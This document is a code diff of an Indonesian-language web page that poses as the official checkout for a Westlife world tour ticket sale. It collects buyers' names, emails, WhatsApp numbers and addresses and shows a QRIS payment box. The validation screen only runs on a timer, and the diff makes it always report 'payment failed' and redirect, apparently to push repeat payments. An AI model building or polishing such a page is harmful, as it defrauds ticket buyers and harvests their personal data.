@@ -23,7 +23,6 @@ color:white;
 overflow-x:hidden;
 }
 
-/* BACKGROUND */
 body::before{
 content:'';
 position:fixed;
@@ -34,7 +33,6 @@ radial-gradient(circle at bottom right, rgba(255,200,0,.15), transparent 30%);
 z-index:-2;
 }
 
-/* PARTICLES */
 body::after{
 content:'';
 position:fixed;
@@ -74,7 +72,6 @@ position:relative;
 overflow:hidden;
 }
 
-/* GLOW */
 .card::before{
 content:'';
 position:absolute;
@@ -128,7 +125,6 @@ color:#ccc;
 line-height:1.8;
 }
 
-/* TIMER */
 .timer-box{
 text-align:center;
 padding:18px;
@@ -194,23 +190,6 @@ grid-template-columns:1fr 1fr;
 gap:20px;
 }
 
-.total-box{
-padding:25px;
-margin-top:25px;
-text-align:center;
-font-size:28px;
-font-weight:800;
-background:linear-gradient(45deg,rgba(255,120,0,.2),rgba(255,200,0,.1));
-border-radius:25px;
-border:1px solid rgba(255,255,255,.1);
-box-shadow:0 0 30px rgba(255,153,0,.2);
-}
-
-.total-box span{
-color:#ffcc66;
-}
-
-/* QRIS */
 .qris-box{
 display:none;
 margin-top:30px;
@@ -241,7 +220,6 @@ margin:20px 0;
 box-shadow:0 0 25px rgba(255,153,0,.4);
 }
 
-/* BUTTON */
 .buy-btn{
 width:100%;
 padding:18px;
@@ -262,9 +240,7 @@ letter-spacing:1px;
 transform:translateY(-5px) scale(1.02);
 }
 
-/* LOADING */
 .loading-screen,
-.success-screen,
 .failed-screen{
 position:fixed;
 inset:0;
@@ -289,7 +265,6 @@ margin-bottom:30px;
 }
 
 .loading-screen h1,
-.success-screen h1,
 .failed-screen h1{
 font-size:40px;
 margin-bottom:20px;
@@ -297,7 +272,6 @@ color:#ffcc66;
 }
 
 .loading-screen p,
-.success-screen p,
 .failed-screen p{
 font-size:18px;
 color:#ddd;
@@ -321,7 +295,6 @@ transform:translateY(0)
 }
 }
 
-/* MOBILE */
 @media(max-width:768px){
 
 .grid{
@@ -347,7 +320,6 @@ padding:20px;
 
 <div class="card">
 
-<!-- BANNER -->
 <img src="banner.png" class="banner" alt="Banner Westlife">
 
 <h1 class="title">
@@ -358,7 +330,6 @@ WESTLIFE THE ANNIVERSARY WORLD TOUR
 Official Checkout & Ticket Reservation
 </p>
 
-<!-- TIMER -->
 <div class="timer-box">
 Sisa Waktu Pengisian :
 <span id="timer">07:00</span>
@@ -366,14 +337,11 @@ Sisa Waktu Pengisian :
 
 <form id="checkoutForm">
 
-<!-- NAMA -->
 <div class="form-group">
 <label>Nama Lengkap</label>
-
 <input type="text" id="nama" required>
 </div>
 
-<!-- GRID -->
 <div class="grid">
 
 <div class="form-group">
@@ -389,22 +357,18 @@ required
 
 <div class="form-group">
 <label>Email</label>
-
 <input type="email" id="email" required>
 </div>
 
 </div>
 
-<!-- GRID -->
 <div class="grid">
 
 <div class="form-group">
 <label>No. WhatsApp</label>
-
 <input type="tel" id="wa" required>
 </div>
 
-<!-- CATEGORY -->
 <div class="form-group">
 
 <label>Category Tiket</label>
@@ -449,7 +413,6 @@ CAT 6 A & B - Rp 850.000
 
 </div>
 
-<!-- GRID -->
 <div class="grid">
 
 <div class="form-group">
@@ -466,20 +429,16 @@ required
 
 <div class="form-group">
 <label>Total Otomatis</label>
-
 <input type="text" id="total" readonly>
 </div>
 
 </div>
 
-<!-- ALAMAT -->
 <div class="form-group">
 <label>Alamat / Domisili</label>
-
 <textarea rows="4" id="alamat" required></textarea>
 </div>
 
-<!-- QRIS -->
 <div class="qris-box" id="qrisBox">
 
 <h2>PEMBAYARAN QRIS</h2>
@@ -505,7 +464,6 @@ required
 
 </div>
 
-<!-- BUTTON -->
 <button type="submit" class="buy-btn">
 BELI SEKARANG
 </button>
@@ -531,34 +489,17 @@ Sistem Sedang Memvalidasi Pembayaran Anda...
 
 </div>
 
-<!-- SUCCESS -->
-<div class="success-screen" id="successScreen">
-
-<h1>
-PEMBELIAN SEDANG DALAM PROSES
-</h1>
-
-<p>
-E-TICKET ANDA AKAN DIKIRIM MELALUI EMAIL
-<br>
-Anda Akan Dialihkan Otomatis Dalam
-<span id="redirectTimer">5</span>
-Detik
-</p>
-
-</div>
-
 <!-- FAILED -->
 <div class="failed-screen" id="failedScreen">
 
 <h1>
-WAKTU HABIS
+PEMBAYARAN GAGAL
 </h1>
 
 <p>
-Waktu Pengisian Data Melebihi 7 Menit.
+Transaksi Tidak Dapat Diproses.
 <br>
-Silahkan Ulangi Pemesanan Tiket.
+Anda Akan Dialihkan Otomatis...
 </p>
 
 </div>
@@ -573,37 +514,28 @@ const qrisBox = document.getElementById('qrisBox');
 
 /* FORMAT */
 function formatRupiah(number){
-
 return 'Rp ' + number.toLocaleString('id-ID');
-
 }
 
 /* CALCULATE */
 function calculateTotal(){
 
 const price = parseInt(ticketCategory.value || 0);
-
 const qty = parseInt(jumlah.value || 0);
 
 const grandTotal = price * qty;
 
 total.value = formatRupiah(grandTotal);
 
-/* SHOW QRIS */
 if(price > 0 && qty > 0){
-
 qrisBox.style.display = 'block';
-
 }else{
-
 qrisBox.style.display = 'none';
-
 }
 
 }
 
 ticketCategory.addEventListener('change', calculateTotal);
-
 jumlah.addEventListener('input', calculateTotal);
 
 calculateTotal();
@@ -616,11 +548,9 @@ const timerDisplay = document.getElementById('timer');
 const countdown = setInterval(()=>{
 
 let minutes = Math.floor(time / 60);
-
 let seconds = time % 60;
 
 minutes = minutes < 10 ? '0' + minutes : minutes;
-
 seconds = seconds < 10 ? '0' + seconds : seconds;
 
 timerDisplay.innerHTML = `${minutes}:${seconds}`;
@@ -659,7 +589,6 @@ inputs.forEach(input=>{
 if(!input.value){
 
 valid = false;
-
 input.style.border='2px solid red';
 
 }else{
@@ -673,42 +602,28 @@ input.style.border='1px solid rgba(255,255,255,.1)';
 if(!valid){
 
 alert('Semua Data Wajib Diisi!');
-
 return;
 
 }
 
 clearInterval(countdown);
 
-/* LOADING */
+/* SHOW LOADING */
 document.getElementById('loadingScreen').style.display='flex';
 
-/* FAKE LOADING */
+/* AFTER 60 SECOND */
 setTimeout(()=>{
 
 document.getElementById('loadingScreen').style.display='none';
 
-document.getElementById('successScreen').style.display='flex';
+document.getElementById('failedScreen').style.display='flex';
 
-let redirect = 5;
+/* REDIRECT FAILED */
+setTimeout(()=>{
 
-const redirectTimer = document.getElementById('redirectTimer');
+window.location.href='https://fforeverindonesia-svg.github.io/failed.html/';
 
-const autoRedirect = setInterval(()=>{
-
-redirect--;
-
-redirectTimer.innerHTML = redirect;
-
-if(redirect <= 0){
-
-clearInterval(autoRedirect);
-
-window.location.href='https://fforeverindonesia-svg.github.io/PEMBELIAN-ULANG-WESTLIFE/https://fforeverindonesia-svg.github.io/PEMBELIAN-ULANG-WESTLIFE/';
-
-}
-
-},1000);
+},4000);
 
 },60000);
 
